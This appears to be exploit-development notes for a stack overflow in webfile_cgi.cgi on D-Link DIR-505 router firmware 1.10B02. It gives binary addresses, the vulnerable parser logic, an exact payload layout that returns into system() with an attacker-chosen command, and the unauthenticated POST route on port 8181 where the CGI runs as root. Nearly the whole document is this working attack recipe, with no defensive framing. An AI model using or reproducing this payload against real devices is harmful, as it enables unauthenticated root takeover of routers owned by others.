# webfile_cgi.cgi 1.10B02 Layout Notes

## Identity

| Item | Value |
|---|---|
| Path | `/usr/bin/webfile_cgi.cgi` |
| MD5 | `28cb86cc8b93ba2e4a47c6261403b5ce` |
| Size | 64872 bytes |
| Architecture | MIPS32 big-endian, non-PIE |
| Service | lighttpd-ws, TCP/8181 |
| Privilege | root |
| Firmware | DIR-505 A1 1.10B02 (`cd13a30e3f971c23eace3ae94380f28b`) |

## Relevant addresses

| Item | Address |
|---|---|
| `.text` | `0x401ae0` - `0x40d160` |
| `.MIPS.stubs` | `0x40d160` - `0x40d520` |
| `system` PLT stub | `0x40d180` |
| `get_input_entries` | `0x406690` |
| `main` | `0x406854` |

## Stack write

`main()` passes `local_cf68 + 0x14` to `get_input_entries` after zeroing
`0xcf3a` bytes. The parser uses:

```c
buf[offset + field * 0x425]      = ch;  /* name  */
buf[offset + field * 0x425 + 0x24] = ch; /* value */
```

`field` is increased by every `&`; `offset` is reset on `&` and `=`. A long
body therefore writes past the local buffer and into `main()`'s saved
registers and return address.

## Exploit alignment

- 49 `&` entries move the next field to index 49.
- `a=` starts at entry 49; its value begins at `buf + 49 * 0x425 + 0x24`.
- The value is 1051 bytes:
  `0x00 + "A"*1026 + 5 * p32(0) + p32(0x40d180)`.
- `main()` returns to `0x40d180` (`.system` PLT).
- The uClibc `strcmp` delay-slot effect leaves `$a0` pointing to
  `field0_value + 1`, i.e. the command after the leading `0`.

## Auth / route

- HTTP entry: `POST /dws/api/ListRoot` on TCP/8181.
- No Cookie, session, or HNAP credential is checked before the parser runs.
- `webfile_cgi.cgi` is launched by lighttpd-ws as root.
